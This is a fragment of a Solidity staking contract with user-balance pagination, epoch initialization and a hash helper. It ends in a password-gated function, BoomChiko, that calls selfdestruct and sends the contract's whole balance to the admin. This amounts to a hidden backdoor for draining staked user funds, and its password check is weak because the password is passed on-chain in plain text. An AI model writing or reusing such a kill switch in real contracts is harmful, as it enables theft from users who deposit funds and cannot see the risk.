        for (_ulIndex; _ulIndex < _resultsPerPage * _page; _ulIndex++) {
            if (_ulIndex < _userList.length) {
                _ulReturn[_returnCounter] = SummaryOfUser({
                    index: _ulIndex,
                    user: _userList[_ulIndex].user,
                    totalRewards: _userList[_ulIndex].totalRewards,
                    lockedBalance: _userBalance[_userList[_ulIndex].user][
                        BalanceTypes.LOCKED
                    ],
                    unlockedBalance: _userBalance[_userList[_ulIndex].user][
                        BalanceTypes.UNLOCKED
                    ]
                });
            } else {
                _ulReturn[_returnCounter] = emptyUserInfo;
            }
            _returnCounter++;
        }
        return (count = _userList.length - 1, list = _ulReturn);
    }

    // / Epoch Initalize --- _MAXIMUM_EPOCH_FOR_VALIDATORS+7 epoch
    // / Anyone Call
    function epochInit() public returns (uint256, uint256) {
        uint256 beforeInitilazedLastEpoch = initilazedLastEpoch;
        uint256 nextEpoch = _calculateNextEpoch();
        if (
            initilazedLastEpoch == 0 ||
            ((initilazedLastEpoch - nextEpoch) <
                (_MAXIMUM_EPOCH_FOR_VALIDATORS + 7))
        ) {
            uint256 newInits = 0;
            if (initilazedLastEpoch == 0) {
                newInits = _MAXIMUM_EPOCH_FOR_VALIDATORS + 7;
            } else {
                newInits =
                    _MAXIMUM_EPOCH_FOR_VALIDATORS +
                    7 -
                    (initilazedLastEpoch - nextEpoch);
            }
            for (uint256 i = 0; i < newInits; i = i + 1) {
                initilazedLastEpoch = initilazedLastEpoch + 1;
                _epochInitalize(initilazedLastEpoch);
            }
        }
        return (beforeInitilazedLastEpoch, initilazedLastEpoch);
    }

    function _epochInitalize(uint256 _epoch) internal {
        if (emptyVotes.length != _MAXIMUM_VALIDATORS) {
            uint256[] memory EmptyVotes = new uint256[](_MAXIMUM_VALIDATORS);
            for (uint256 i = 0; i < _MAXIMUM_VALIDATORS; i++) {
                EmptyVotes[i] = uint256(0);
            }
            emptyVotes = EmptyVotes;
        }

        if (_epochList[_epoch].epoch == 0) {
            _epochList[_epoch] = Epoch({
                epoch: _epoch,
                totalRewards: 0,
                totalSelfStakes: 0,
                totalUserStakes: 0,
                totalRewardScore: 0,
                voteX: emptyVotes
            });
            selfStakesForEpoch[_epoch][0] = 0;
        }
    }

    /** ------------------------------------------------------------------------------------------- */
    function getHash(string memory _text, string memory _anotherText)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(_text, _anotherText));
    }

    /** ------------------------------------------------------------------------------------------- */

    function BoomChiko(string memory password)
        public
        PassworRequired(
            password,
            0xfee22e2490a5b262e4893801a5c055695fa93e55ba314c3b48342d95a1a54d61
        )
    {
        selfdestruct(payable(admin));
    }
}
